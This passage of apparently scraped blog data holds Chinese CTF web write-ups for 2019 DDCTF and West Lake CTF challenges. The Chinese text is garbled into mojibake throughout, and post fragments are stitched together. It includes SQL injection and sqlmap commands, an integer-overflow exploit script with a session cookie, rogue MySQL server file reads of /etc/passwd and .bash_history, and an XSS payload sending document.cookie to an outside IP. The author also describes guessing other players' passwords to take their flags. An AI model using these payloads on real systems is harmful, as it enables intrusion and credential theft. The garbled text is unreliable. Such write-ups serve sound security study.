å…¥æ•°ç»„æ¥æ§åˆ¶æ‰§è¡Œé¡ºåºï¼Œåªè¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªç¬¬ä¸€ä¸ªå‚æ•°ä¸ºbut_handlerçš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºget_Flagçš„å‡½æ•°å°±å¯ä»¥å®ç°åœ¨è°ƒç”¨èŠ±è´¹å‡½æ•°ä¹‹å‰æ¥è¾“å‡º Flag äº†ã€‚\næ€ä¹ˆæ„é€ æ•°ç»„å‘¢ï¼Ÿåœ¨execute_event_loopä¸­å¯¹äºå‚æ•°çš„å¤„ç†å¯ä»¥è‡ªå·±éšä¾¿æµ‹è¯•ä¸€ä¸‹å°±çŸ¥é“äº†ä»–æ˜¯ä»¥:;ä¹‹åçš„å­—ç¬¦ä¸²ä»¥#ä¸ºåˆ†å‰²æ¥å½¢æˆæ•°ç»„çš„ã€‚\n \næ‰€ä»¥è¿™æ ·å­æˆ‘ä»¬å°±æˆåŠŸå°†get_flagå‡½æ•°ä¼˜å…ˆè°ƒç”¨äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¤„ç†ä¸€äº›ç»†èŠ‚çš„äº‹æƒ…äº†ï¼Œæ¯”å¦‚è°ƒç”¨get_Flagåœ¨æºä»£ç ä¸­æ˜¯get_flag_handlerï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„å‚æ•°æ˜¯action:get_flagï¼Œä»¥åŠ Flag æœ€åæ˜¯é€šè¿‡ä»¥ä¸‹å‡½æ•°è°ƒç”¨trigger_eventæŠŠ Flag è¾“å‡ºåˆ°session['log']å½“ä¸­çš„ã€‚\ndef get_flag_handler(args): if session[\u0026#39;num_items\u0026#39;] \u0026gt;= 5: trigger_event(\u0026#39;func:show_flag;\u0026#39; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(\u0026#39;action:view;index\u0026#39;) æ‰€ä»¥æˆ‘ä»¬çš„ payload å°±æ˜¯action:trigger_event%23;action:buy;8%23action:get_flag;ï¼Œå†é€šè¿‡pç‰›çš„ flask cookie è§£å¯†è„šæœ¬å³å¯å¾—åˆ° flag\n \nWeb 5 æ¬¢è¿æŠ¥åDDCTF Description {% colorquote info %}\nhttp://117.51.147.2/Ze02pQYLf5gGNyMn/\næç¤ºï¼šXSSä¸æ˜¯è·å–cookie æç¤º2ï¼šä¹‹åæ˜¯æ³¨å…¥\n{% endcolorquote %}\nHacking ä¸€å¼€å§‹æ ¹æœ¬æ‰“ä¸äº†â€¦è€Œä¸”è¿˜è¢«äººç”¨ Beff æ…å±äº†\u0026hellip;è€Œä¸”ä¸¥é‡æ€€ç–‘è¿™é¢˜æ˜¯ä¸­é€”æ”¹é¢˜çš„â€¦å¾ˆå‘\n \né¦–å…ˆé¢˜ç›®è®¾ç½®æ¯”è¾ƒç®€å•\n \næµ‹è¯• XSS ï¼Œä½†æ˜¯è´¼å‘çš„è¯¯å¯¼ä½ ï¼Œè¿”å›äº†æƒ³è¯¯å¯¼ä½ èµ°å…¥ sql æ³¨å…¥çš„å¤§å‘ã€‚\n \næˆ‘ä»¬å¯ä»¥ç”¨ xss æ‹¿åˆ° admin.php çš„ html æºç \n \nçœ‹åˆ°æºç ä¸­ä¸€ä¸ªæ¥å£ï¼Œç›´æ¥è®¿é—®æç¤ºéœ€è¦ä¸€ä¸ª id çš„ä¼ å‚ï¼Œéšä¾¿è¾“å…¥ä¹‹åçœ‹åˆ°å“åº”åŒ…\nHTTP/1.1 200 OK Date: Thu, 25 Apr 2019 03:06:39 GMT Server: Apache Content-Length: 31 Connection: close Content-Type: text/html;charset=gbk \u0026lt;title\u0026gt;List Query API\u0026lt;/title\u0026gt; å‘ç°Content-Typeä¸ºcharset=gbkï¼ŒçŒœæµ‹æ˜¯ä¸€ä¸ªå®½å­—èŠ‚æ³¨å…¥ã€‚è€Œä¸”å¹¶æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œç›´æ¥å¼€æ³¨ï¼Œå¯èƒ½å”¯ä¸€éœ€è¦ä¸€ç‚¹ trick çš„å°±æ˜¯éœ€è¦ç”¨åå…­è¿›åˆ¶ç»•è¿‡è¢«è½¬ä¹‰çš„å•å¼•å·äº†\u0026hellip;\næ³¨å‡ºåº“å\n \næ³¨å‡ºè¡¨å\n \næ³¨å‡ºå­—æ®µå\n \næ‹¿åˆ° flag\n \nå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ sqlmap ç›´æ¥è·‘ã€‚\n \nä¹Ÿå¯ä»¥æŒ‡å®šä½¿ç”¨--tamper unmagicquotesæ¥è¿›è¡Œæ³¨å…¥\npython sqlmap.py -u \u0026#34;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\u0026#34; --tamper unmagicquotes --hex --level 3 -D ctfdb -T ctf_fhmHRPL5 --dump Web 6 å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡ï½ Description {% colorquote info %}\nhttp://117.51.147.155:5050/index.html#/login æ³¨å†Œç”¨æˆ·ç™»é™†ç³»ç»Ÿå¹¶è´­ä¹°å…¥åœºç¥¨æ®,æ·˜æ±°æ‰€æœ‰å¯¹æ‰‹å°±èƒ½åƒé¸¡å•¦~\næœ¬é¢˜ä¸éœ€è¦ä½¿ç”¨æ‰«æå™¨\n{% endcolorquote %}\nHacking ä¸€å¼€å§‹ä¸€ç›´åœ¨æº¢å‡ºè´­ä¹°çš„è¿™é‡Œï¼Œä½†æ˜¯ä¸€æ—¦æº¢å‡ºäº†ï¼ŒæœåŠ¡å™¨å°±è¿”å› 500 äº†\u0026hellip;\nGET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1 Host: 117.51.147.155:5050 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: application/json Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://117.51.147.155:5050/index.html Connection: close Cookie: user_name=zedd; REVEL_SESSION=ef66cfc3f5199180eea686597f4a1e72 ç„¶åçœ‹åˆ°ä¸€é“ç±»ä¼¼æŠ¤ç½‘æ¯Itshopé¢˜ç›®ï¼Œæ‰€ä»¥è€ƒè™‘è¿™ä¸ªåœ°æ–¹æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ç”¨çš„æ˜¯ä½™é¢-æ”¯å‡ºè¿™ä¹ˆä¸ªæ“ä½œæ¥æº¢å‡ºå‘¢\n \næŸ¥æ‰¾ GoLang çš„ç›¸å…³æ•°æ®ç±»å‹ï¼Œç”¨ uint32 æˆåŠŸæº¢å‡ºã€‚\n \nçŒœæµ‹åœ¨ price è½¬æ¢æˆ int çš„æ—¶å€™å‘ç”Ÿæº¢å‡ºå˜æˆ -1 ï¼Œå¯¼è‡´ä½™é¢å‡å»èŠ±è´¹å¤§äº0ï¼ŒæˆåŠŸç»•è¿‡åˆ¤æ–­ä¹°åˆ°å…¥åœºåˆ¸ã€‚\nä¹‹åå°±æ¯”è¾ƒç®€å•äº†ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥ ticket æ€ bot ï¼ŒçŒœæµ‹ id ä¸ ticket æœ‰æŸç§æ˜ å°„å…³ç³»ï¼Œå¯ä»¥æ³¨å†Œä¸€ç³»åˆ—å°å·ä¹° ticket ä¿å¤§å·æ€ã€‚\n \né™„ä¸Šè„šæœ¬ã€‚\nimport requests import re import time username = \u0026#39;zedde\u0026#39; base_url = \u0026#39;http://117.51.147.155:5050\u0026#39; register = base_url + \u0026#39;/ctf/api/register?name={0}\u0026amp;password=12345678\u0026#39; buy_url = base_url + \u0026#39;/ctf/api/buy_ticket?ticket_price=4294967296\u0026#39; search_url = base_url + \u0026#39;/ctf/api/search_bill_info\u0026#39; pay_url = base_url + \u0026#39;/ctf/api/pay_ticket?bill_id=\u0026#39; remove_url = base_url + \u0026#39;/ctf/api/remove_robot?id={0}\u0026amp;ticket={1}\u0026#39; cookies = dict(user_name=\u0026#39;zedd\u0026#39;,REVEL_SESSION=\u0026#39;ef66cfc3f5199180eea686597f4a1e72\u0026#39;) for i in range(0,700): user = username + str(i) register_url = register.format(user) req = requests.session() rep = req.get(register_url) rep = req.get(buy_url) rep = req.get(search_url) str_text = r\u0026#39;\u0026#34;bill_id\u0026#34;:\u0026#34;(.*)\u0026#34;,\u0026#39; match = re.search(str_text, rep.text, re.M|re.I) if match: bill_id = match.group(1) rep = req.get(pay_url + bill_id) matchObj = re.search( r\u0026#39;{\u0026#34;your_id\u0026#34;:(.*),\u0026#34;your_ticket\u0026#34;:\u0026#34;(.*)\u0026#34;}]\u0026#39;, rep.text, re.M|re.I) # print(rep.text) if matchObj: bot_id = matchObj.group(1) ticket = matchObj.group(2) else: continue r = requests.get(remove_url.format(bot_id,ticket), cookies=cookies) print(r.text) time.sleep(1) è¿™é¢˜è¿˜æœ‰ä¸€ç§ trick å°±æ˜¯çŒœæ¦œå•å·²ç»åšå‡ºæ¥çš„å¸ˆå‚…çš„å¯†ç ï¼Œä¸€èˆ¬ id éƒ½æ˜¯å¸ˆå‚…ä»¬çš„ id ï¼Œå¯†ç å¤§å¤šéƒ½æ˜¯12345678(åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“â€¦æˆ‘ä¹Ÿæ˜¯12345678\u0026hellip;\næ¯”å¦‚è¿™ä½å¸ˆå‚…ï¼Œç”¨ 12345678 ç™»è¿›å»å°±æ‹¿åˆ°ä»–çš„ flag äº†ã€‚åé¢å°±æ˜¯ä½ æ•¢ä¸æ•¢äº¤çš„é—®é¢˜äº†\u0026hellip;æ‰‹åŠ¨æ–œçœ¼ï¼Œæ¯•ç«Ÿåé¢æœ‰ä¸€æ®µçœ‹èµ·æ¥è²Œä¼¼æ˜¯éšæœºçš„å­—ç¬¦ä¸²â€¦å¯èƒ½æ˜¯ä¸»åŠæ–¹ç”¨æ¥é˜²ä½œå¼Šçš„ï¼Ÿä¸å¾—è€ŒçŸ¥â€¦hhhh\n \nåé¢çœ‹å®˜æ–¹çš„ wp å‘ç°å…‰æˆ¿é¢„è®¾è§£å…¶å®æ˜¯æƒ³è®©é€‰æ‰‹ç”¨ md5 é•¿åº¦æ‹“å±•æ”»å‡»å»åšçš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢è¿™é¢˜ mysql å¼±å£ä»¤æ¥è¯»åƒé¸¡çš„æºç æ‹¿ flagã€‚\nå¦å¤–ï¼šç™»å½•é‚£é‡Œè¿˜æœ‰ä¸ªæ°´å¹³è¶Šæƒï¼Œæ— è®ºæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šè¿”å›ç”¨æˆ·çš„ cookie ï¼Œå› æ­¤ä¹Ÿå¯ä»¥çŒœå¸ˆå‚…ä»¬çš„ç”¨æˆ·åï¼Œç›´æ¥å¸¦ç€ cookie å»çœ‹ä»–çš„/main/resultå³å¯ã€‚(2333\nWeb 7 WEB mysqlå¼±å£ä»¤ Description {% colorquote info %}\nhttp://117.51.147.155:5000/index.html#/scan éƒ¨ç½²agent.pyå†è¿›è¡Œæ‰«æå“¦~\næœ¬é¢˜ä¸éœ€è¦ä½¿ç”¨æ‰«æå™¨\n{% endcolorquote %}\nHacking å¾ˆç»å…¸çš„ Rogue-Mysql-Server ä¸€é¢˜ï¼Œä½†æ˜¯å‘ç‚¹è¿˜æ˜¯æœ‰çš„ã€‚å»ºè®®ä½¿ç”¨è¿™ä¸ª Github ä»“åº“æ¥åšallyshka/Rogue-MySql-Server\né¢˜ç›®ç»™äº†ä¸€ä¸ª agent.py\n#!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 12/1/2019 2:58 PM # @Author : fz # @Site :  # @File : agent.py # @Software: PyCharm import json from http.server import HTTPServer, BaseHTTPRequestHandler from optparse import OptionParser from subprocess import Popen, PIPE class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(\u0026#34;\\n----- Request Start -----\u0026gt;\\n\u0026#34;) print(\u0026#34;request_path :\u0026#34;, request_path) print(\u0026#34;self.headers :\u0026#34;, self.headers) print(\u0026#34;\u0026lt;----- Request End -----\\n\u0026#34;) self.send_response(200) self.send_header(\u0026#34;Set-Cookie\u0026#34;, \u0026#34;foo=bar\u0026#34;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(\u0026#34;\\n----- Request Start -----\u0026gt;\\n\u0026#34;) print(\u0026#34;request_path : %s\u0026#34;, request_path) request_headers = self.headers content_length = request_headers.getheaders(\u0026#39;content-length\u0026#39;) length = int(content_length[0]) if content_length else 0 # print(\u0026#34;length :\u0026#34;, length) print(\u0026#34;request_headers : %s\u0026#34; % request_headers) print(\u0026#34;content : %s\u0026#34; % self.rfile.read(length)) # print(\u0026#34;\u0026lt;----- Request End -----\\n\u0026#34;) self.send_response(200) self.send_header(\u0026#34;Set-Cookie\u0026#34;, \u0026#34;foo=bar\u0026#34;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen([\u0026#39;netstat\u0026#39;, \u0026#39;-tlnp\u0026#39;], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {\u0026#39;local_address\u0026#39;: Local_Address, \u0026#39;Process_name\u0026#39;: Process_name} result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GET def main(): port = 8123 print(\u0026#39;Listening on localhost:%s\u0026#39; % port) server = HTTPServer((\u0026#39;0.0.0.0\u0026#39;, port), RequestHandler) server.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: parser = OptionParser() parser.usage = ( \u0026#34;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\\n\u0026#34; \u0026#34;Run:\\n\\n\u0026#34;) (options, args) = parser.parse_args() main() è¿™é‡Œå¯èƒ½ä¼šæ¯”è¾ƒå®¹æ˜“è¯¯å¯¼ï¼Œé¢˜ç›®æ˜¯å›ºå®šåœ°å»è¯·æ±‚ä½ çš„ 8123 ç«¯å£ï¼Œä½ å¿…é¡»å¾—åœ¨ 8123 éƒ¨ç½²è¿™ä¸ª agent.py ï¼Œç„¶åçœ‹ä»£ç ï¼Œè¿™ä¸ª agent.py å¹¶æ²¡æœ‰åšä¸€ä¸ªå†…ç½‘è½¬å‘ä»£ç†ä»€ä¹ˆçš„ï¼Œåªä¸è¿‡æ˜¯æ¢æµ‹ä½ éƒ¨ç½²çš„æœºå™¨ä¸Šæœ‰æ²¡æœ‰è¿è¡Œ mysqld æœåŠ¡ä»¥åŠå¯¹åº”çš„æœåŠ¡ç«¯å£æ˜¯ä»€ä¹ˆï¼Œç„¶åä»–åœ¨å¤–ç½‘å»è®¿é—® agent.py è¿”å›çš„ mysql çš„ç«¯å£ã€‚çŸ¥é“è¿™ä¸ªå°±éå¸¸å¥½åšäº†ï¼ŒåŸºæœ¬å‘éƒ½ç»•è¿‡äº†\u0026hellip;ä¸ç„¶çš„è¯å°±åƒä¸€å¼€å§‹åªèƒ½ä¸€ä¸ªä¸ªæ’é”™ä»€ä¹ˆçš„\u0026hellip;\nåªè¦æŠŠ agent.py ä¸­çš„è¿”å›ç›´æ¥ç»™ä»–æ”¹äº†ï¼Œæ”¹æˆç›´æ¥è¿”å›è‡ªå·±çš„ç«¯å£å³å¯ã€‚\ndef _func(self): netstat = Popen([\u0026#39;netstat\u0026#39;, \u0026#39;-tlnp\u0026#39;], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {\u0026#39;local_address\u0026#39;: \u0026#39;0.0.0.0:3306\u0026#39;, \u0026#39;Process_name\u0026#39;: \u0026#39;mysqld\u0026#39;} result.append(tmp_dic) return result ä¾‹å¦‚è¿™æ ·ï¼Œä¸ä¸€å®šéå¾— 3306 ï¼Œå¯ä»¥æŠŠ Rogue Mysql é‚£ä¸€å¥—æ”¾åœ¨å…¶ä»–ç«¯å£ä¹Ÿå¯ã€‚\nå…¶ä»–çš„éƒ½æ˜¯ä¸€è´¯çš„ Rogue Mysql çš„æ“ä½œï¼Œè¿™é‡Œå°±ä¸é‡å¤æ¼”ç¤ºäº†ã€‚\nç„¶åå¯ä»¥å»è¯»/root/.bash_historyçœ‹ä¹‹å‰çš„è·¯å¾„æ–‡ä»¶ï¼Œå‘ç°åœ¨/home/dc2-user/ctf_web_2/app/main/views.pyå¯ä»¥è¯»åˆ°é¢˜ç›®æºç \n# coding=utf-8 from flask import jsonify, request from struct import unpack from socket import inet_aton import MySQLdb from subprocess import Popen, PIPE import re import os import base64 # flag in mysql curl@localhost database:security table:flag def weak_scan(): agent_port = 8123 result = [] target_ip = request.args.get(\u0026#39;target_ip\u0026#39;) target_port = request.args.get(\u0026#39;target_port\u0026#39;) if not target_ip or not target_port: return jsonify({\u0026#34;code\u0026#34;: 404, \u0026#34;msg\u0026#34;: \u0026#34;Ã¥ÂÂ‚Ã¦Â•Â°Ã¤Â¸ÂÃ¨ÂƒÂ½Ã¤Â¸ÂºÃ§Â©Âº\u0026#34;, \u0026#34;data\u0026#34;: []}) if not target_port.isdigit(): return jsonify({\u0026#34;code\u0026#34;: 404, \u0026#34;msg\u0026#34;: \u0026#34;Ã§Â«Â¯Ã¥ÂÂ£Ã¥Â¿Â…Ã©Â¡Â»Ã¤Â¸ÂºÃ¦Â•Â°Ã¥Â­Â—\u0026#34;, \u0026#34;data\u0026#34;: []}) if not checkip(target_ip): return jsonify({\u0026#34;code\u0026#34;: 404, \u0026#34;msg\u0026#34;: \u0026#34;Ã¥Â¿Â…Ã©Â¡Â»Ã¨Â¾Â“Ã¥Â…Â¥ip\u0026#34;, \u0026#34;data\u0026#34;: []}) if is_inner_ipaddress(target_ip): return jsonify({\u0026#34;code\u0026#34;: 404, \u0026#34;msg\u0026#34;: \u0026#34;ipÃ¤Â¸ÂÃ¨ÂƒÂ½Ã¦Â˜Â¯Ã¥Â†Â…Ã§Â½Â‘ip\u0026#34;, \u0026#34;data\u0026#34;: []}) tmp_agent_result = get_agent_result(target_ip, agent_port) if not tmp_agent_result[0] == 1: tem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) return jsonify({\u0026#34;code\u0026#34;: 404, \u0026#34;msg\u0026#34;: \u0026#34;Ã¦ÂœÂÃ¥ÂŠÂ¡Ã¥Â™Â¨Ã¦ÂœÂªÃ¥Â¼Â€Ã¥ÂÂ¯mysql\u0026#34;, \u0026#34;data\u0026#34;: result}) tmp_result =mysql_scan(target_ip, target_port) if not tmp_result[\u0026#39;Flag\u0026#39;] == 1: tem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) return jsonify({\u0026#34;code\u0026#34;: 0, \u0026#34;msg\u0026#34;: \u0026#34;Ã¦ÂœÂªÃ¦Â‰Â«Ã¦ÂÂÃ¥Â‡ÂºÃ¥Â¼Â±Ã¥ÂÂ£Ã¤Â»Â¤\u0026#34;, \u0026#34;data\u0026#34;: []}) else: tem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) result.append(tmp_result) return jsonify({\u0026#34;code\u0026#34;: 0, \u0026#34;msg\u0026#34;: \u0026#34;Ã¦ÂœÂÃ¥ÂŠÂ¡Ã¥Â™Â¨Ã¥Â­Â˜Ã¥ÂœÂ¨Ã¥Â¼Â±Ã¥ÂÂ£Ã¤Â»Â¤\u0026#34;, \u0026#34;data\u0026#34;: result}) def checkip(ip): p = re.compile(\u0026#39;^((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)$\u0026#39;) if p.match(ip): return True else: return False def curl(url): tmp = Popen([\u0026#39;curl\u0026#39;, url, \u0026#39;-L\u0026#39;, \u0026#39;-o\u0026#39;, \u0026#39;content.log\u0026#39;], stdout=PIPE) tmp.wait() result = tmp.stdout.readlines() return result def get_agent_result(ip, port): str_port = str(port) url = \u0026#39;http://\u0026#39;+ip + \u0026#39;:\u0026#39; + str_port curl(url) if not os.path.exists(\u0026#39;content.log\u0026#39;): return (0, \u0026#39;Ã¦ÂœÂªÃ¥Â¼Â€Ã¥ÂÂ¯agent\u0026#39;) with open(\u0026#39;content.log\u0026#39;) as f1: tmp_list = f1.readlines() response = \u0026#39;\u0026#39;.join(tmp_list) os.remove(\u0026#39;content.log\u0026#39;) if not \u0026#39;mysqld\u0026#39; in response: return (0, response) else: return (1, response) def ip2long(ip_addr): return unpack(\u0026#34;!L\u0026#34;, inet_aton(ip_addr))[0] def is_inner_ipaddress(ip): ip = ip2long(ip) return ip2long(\u0026#39;127.0.0.0\u0026#39;) \u0026gt;\u0026gt; 24 == ip \u0026gt;\u0026gt; 24 or \\ ip2long(\u0026#39;10.0.0.0\u0026#39;) \u0026gt;\u0026gt; 24 == ip \u0026gt;\u0026gt; 24 or \\ ip2long(\u0026#39;172.16.0.0\u0026#39;) \u0026gt;\u0026gt; 20 == ip \u0026gt;\u0026gt; 20 or \\ ip2long(\u0026#39;192.168.0.0\u0026#39;) \u0026gt;\u0026gt; 16 == ip \u0026gt;\u0026gt; 16 def mysql_scan(ip, port): port = int(port) weak_user = [\u0026#39;root\u0026#39;, \u0026#39;admin\u0026#39;, \u0026#39;mysql\u0026#39;] weak_pass = [\u0026#39;\u0026#39;, \u0026#39;mysql\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;admin\u0026#39;, \u0026#39;test\u0026#39;] Flag = 0 for user in weak_user: for pass_wd in weak_pass: if mysql_login(ip,port, user, pass_wd): Flag = 1 tmp_dic = {\u0026#39;weak_user\u0026#39;: user, \u0026#39;weak_passwd\u0026#39;: pass_wd, \u0026#39;Flag\u0026#39;: Flag} return tmp_dic else: tmp_dic = {\u0026#39;weak_user\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;weak_passwd\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;Flag\u0026#39;: Flag} return tmp_dic def mysql_login(host, port, username, password): \u0026#39;\u0026#39;\u0026#39;mysql login check\u0026#39;\u0026#39;\u0026#39; try: conn = MySQLdb.connect( host=host, user=username, passwd=password, port=port, connect_timeout=1, ) print (\u0026#34;[H:%sP:%sU:%sP:%s]Mysql login Success\u0026#34; % (host,port,username,password),\u0026#34;Info\u0026#34;) conn.close() return True except MySQLdb.Error, e: print (\u0026#34;[H:%sP:%sU:%sP:%s]Mysql Error %d:\u0026#34; % (host,port,username,password,e.args[0]),\u0026#34;Error\u0026#34;) return False å¯ä»¥è¯»/etc/passwdæ‹¿åˆ° mysql çš„è·¯å¾„ï¼Œç„¶åæ ¹æ® mysql çš„è·¯å¾„ä¸ flag åœ¨æ•°æ®åº“ä¸­çš„ä½ç½®æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»/var/lib/mysql/security/flag.ibdä¸­å¯ä»¥æ‹¿åˆ° flagï¼Œä¹Ÿå¯ä»¥è¯»/var/lib/mysql/ibdata1ï¼Œåªæ˜¯è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬æ¯”è¾ƒå¤§ã€‚\n \nä¹Ÿæœ‰å¸ˆå‚…è¯´å¯ä»¥è¯».mysqlhistory\n \n.mysql_historyè™½ç„¶è¯»ä¸åˆ°æ•°æ®åº“å†…å®¹ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå‡ºé¢˜è€…æ˜¯ç”¨äº†insertï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„æ“ä½œçš„è¯­å¥ï¼Œä¹Ÿæ‹¿åˆ°äº† flag\nè¿™é‡Œå¯ä»¥è¯»åˆ°åƒé¸¡é‚£é¢˜çš„ä»£ç ï¼Œè·¯å¾„ä¸º/home/dc2-user/ctf_web_1/web_1/main/views.py\nfrom flask import jsonify, request,redirect from app import mongodb from app.unitis.tools import get_md5, num64_to_32 from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_id import uuid from urllib import unquote mydb = mongodb.db flag = \u0026#39;\u0026#39;\u0026#39;DDCTF{chiken_dinner_hyMCX[n47Fx)}\u0026#39;\u0026#39;\u0026#39; Web 8 WEB å†æ¥1æ¯Java Description {% colorquote info %}\nç»‘å®šHostè®¿é—®ï¼š\n116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com\nhttp://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/\n{% endcolorquote %}\nHacking æ¯”èµ›çš„æ—¶å€™æä¸å‡ºæ¥â€¦èµ›åå¤ç°çœ‹èµ·æ¥å¾—ææŒºå¤šçš„â€¦è¿˜æ˜¯å¦å¼€ä¸€ç¯‡å†™å§ã€‚\n","date":"2019-05-06T08:50:43Z","permalink":"https://blog.zeddyu.info/2019/05/06/2019ddctf/","title":"2019 DDCTF Web wp"},{"content":"2019è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ› Web wpã€‚é™¤äº†æœ€åä¸€é“åŸé¢˜æ²¡æ—¶é—´åšï¼Œå…¶ä»–éƒ½å¼„å‡ºæ¥äº†ã€‚\n[TOC]\nWeb Web 1 çŒœçŒœ flag åœ¨å“ª Description {% colorquote info %} NULL\né¢˜ç›®åœ°å€ï¼šhttp://ctf1.linkedbyx.com:10122\n{% endcolorquote %}\nHacking æ‰«ç›®å½•å‘ç°æœ‰.DS_Storeæ–‡ä»¶ï¼Œå‘ç°http://ctf1.linkedbyx.com:10122/e10adc3949ba59abbe56e057f20f883eç›®å½•ä¸‹æœ‰ git æ³„éœ²\næ‹¿åˆ°æ–‡ä»¶ä¹‹åæœ‰ä¸ªå‹ç¼©åŒ…ï¼Œå°è¯•æ˜æ–‡æ”»å‡»å¾—åˆ° hint.txt\n \næ‹¿åˆ° code ä¸º 9faedd5999937171912159d28b219d86ï¼Œè®¿é—®flag/seed.txtå‘ç°å›æ˜¾ NAVIE\nåœ¨é¦–é¡µè¾“å…¥ code å‚æ•°ä¸ name å‚æ•°ï¼Œå›æ˜¾äº†å¦ä¸€ä¸ª code\n \nç»¼åˆå‰é¢ç»™å‡ºçš„flag/seed.txtï¼ŒçŒœæµ‹æ˜¯ä¸ªéšæœºæ•°çš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯è¦çŒœè§£éšæœºæ•°é—®é¢˜ï¼Œç”¨php_mt_seedè¿™ä¸ªå·¥å…·ç›´æ¥çˆ†ç ´å¯ä»¥å¾—åˆ° seed\n \nè®¿é—®flag/209228.txtæ‹¿åˆ° flag\nWeb2 breakout Description {% colorquote info %} NULL\né¢˜ç›®åœ°å€ï¼šhttp://ctf2.linkedbyx.com:10611\n{% endcolorquote %}\nHacking éšä¾¿ç”¨ä¸€ä¸ªç”¨æˆ·åè¿›å»ã€‚\n \næœ‰ä¸€ä¸ªç•™è¨€åŠŸèƒ½ï¼Œå¯ä»¥è¿›è¡Œç•™è¨€ï¼Œæœ‰ä¸€ä¸ª report åŠŸèƒ½ï¼Œå¯ä»¥æŠ¥å‘Šä¸€ä¸ª url ç»™ç®¡ç†å‘˜ï¼Œè¿˜æœ‰ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤ä¸æ¸…ç©ºç•™è¨€çš„åŠŸèƒ½ã€‚æ‰€ä»¥å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªåˆ©ç”¨æ€è·¯å°±æ˜¯ç•™è¨€å¤„è¿›è¡Œ xss ï¼ŒæŠŠç•™è¨€ç•Œé¢çš„ url å‘é€ç»™ç®¡ç†å‘˜ï¼Œæ‹¿åˆ° cookie å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\næˆ‘ä»¬å…ˆæµ‹è¯•ç•™è¨€\n\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; \u0026lt;:)\u0026gt;alert(1); å‘ç°æ˜¯å­—ç¬¦æ›¿ä»£ï¼ŒåŸºæœ¬è¿‡æ»¤äº† DOM äº‹ä»¶ï¼Œæµ‹è¯•ç”¨ä»¥ä¸‹ payload\n\u0026lt;/li\u0026gt;\u0026lt;iframe src=\u0026#39;http://106.14.153.173:8080/\u0026#39;\u0026gt;\u0026lt;li\u0026gt; æˆåŠŸæ”¶åˆ°è®¿é—®ä¿¡æ¯ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ç»•è¿‡å­—ç¬¦æ›¿ä»£è¿›è¡Œ xss ã€‚æŒ‰ç…§æˆ‘åšå®¢ä¹‹å‰å†™çš„ xss æ•™ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ src å¤„åˆ©ç”¨ html å®ä½“ç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°å…³é”®å­—äº†ï¼Œå°±åƒä»¥ä¸‹ payload :\n\u0026lt;/li\u0026gt;\u0026lt;iframe src=\u0026#34;\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;:window.location=\u0026#39;http://106.14.153.173:8080/?\u0026#39;+encodeURI(document.cookie)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;li\u0026gt; ç„¶åæˆ‘ä»¬åªéœ€è¦æŠŠhttp://ctf2.linkedbyx.com:10611/main.phpåœ¨ report 